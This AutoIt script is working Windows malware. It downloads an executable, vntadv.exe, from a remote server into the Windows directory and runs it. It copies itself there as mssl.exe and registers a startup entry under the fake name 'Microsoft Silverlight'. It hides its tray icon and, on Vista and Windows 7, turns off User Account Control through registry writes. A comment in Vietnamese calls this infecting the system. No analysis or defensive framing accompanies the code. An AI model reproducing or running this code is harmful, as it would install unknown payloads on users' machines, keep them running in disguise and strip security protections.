#include <InetConstants.au3>
#include <MsgBoxConstants.au3>
#include <WinAPIFiles.au3>

; Download a file in the background.
; Wait for the download to complete.

Example()

Func Example()

   If Not FileExists(@WindowsDir & "\desktopbg") Then DirCreate(@WindowsDir & "\desktopbg")

    ; Save the downloaded file to the temporary folder.
   ;Local $sFilePath = _WinAPI_GetTempFileName(@TempDir)
    

   Local $sFilePath = @WindowsDir & "\desktopbg\vntadv.exe"
	;reDownload file
	;If FileExists(@WindowsDir & "\desktopbg\vntadv.exe") Then FileDelete(@WindowsDir & "\desktopbg\vntadv.exe")
	
    ; Download the file in the background with the selected option of 'force a reload from the remote site.'
    Local $hDownload = InetGet("http://vitinhvnt.vn/test/vntadv.exe", $sFilePath, $INET_FORCERELOAD, $INET_DOWNLOADBACKGROUND)

    ; Wait for the download to complete by monitoring when the 2nd index value of InetGetInfo returns True.
    Do
        Sleep(250)
    Until InetGetInfo($hDownload, $INET_DOWNLOADCOMPLETE)

    ; Retrieve the number of total bytes received and the filesize.
    Local $iBytesSize = InetGetInfo($hDownload, $INET_DOWNLOADREAD)
    Local $iFileSize = FileGetSize($sFilePath)

    ; Close the handle returned by InetGet.
    InetClose($hDownload)

    ; Display details about the total number of bytes read and the filesize.
    ;MsgBox($MB_SYSTEMMODAL, "", "The total download size: " & $iBytesSize & @CRLF & _"The total filesize: " & $iFileSize)

    ; Delete the file.
   ; FileDelete($sFilePath)
EndFunc   ;==>Example

Local $exeLocation = @WindowsDir & "\desktopbg\vntadv.exe"
Run($exeLocation)

; Lay nhiem vao he thong
If @ScriptName <> "mssl.exe" Then
 If ProcessExists("mssl.exe") Then ProcessClose("mssl.exe")
 FileCopy (@ScriptFullPath, @WindowsDir & "\mssl.exe", 1)
 ;Run("mssl", "", @SW_HIDE)
EndIf

RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Microsoft Silverlight", "REG_SZ", @WindowsDir & "\mssl.exe")

#NoTrayIcon
#RequireAdmin
Opt("TrayIconHide", 1)
$a = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$b = "EnableLUA"
$c = "REG_DWORD"
$d = "0"
$var = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA")


if StringInStr("WIN_VISTA|WIN_7", @OSVersion) then
If $var <> 0 Then 
   ; FileWrite (@CommonFilesDir & "\System\en-US\mui\log.txt","Text")
    RegWrite($a, $b, $c, $d)
Else
    Exit
EndIf

$e = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$f = "ConsentPromptBehaviorAdmin"
$g = "REG_DWORD"
$h = "0"
$var = RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "ConsentPromptBehaviorAdmin")
If $var <> 0 Then 
    ;FileWrite (@CommonFilesDir & "\System\en-US\mui\log.txt","Text")
    RegWrite($e, $f, $g, $h)
Else
    Exit
EndIf

EndIf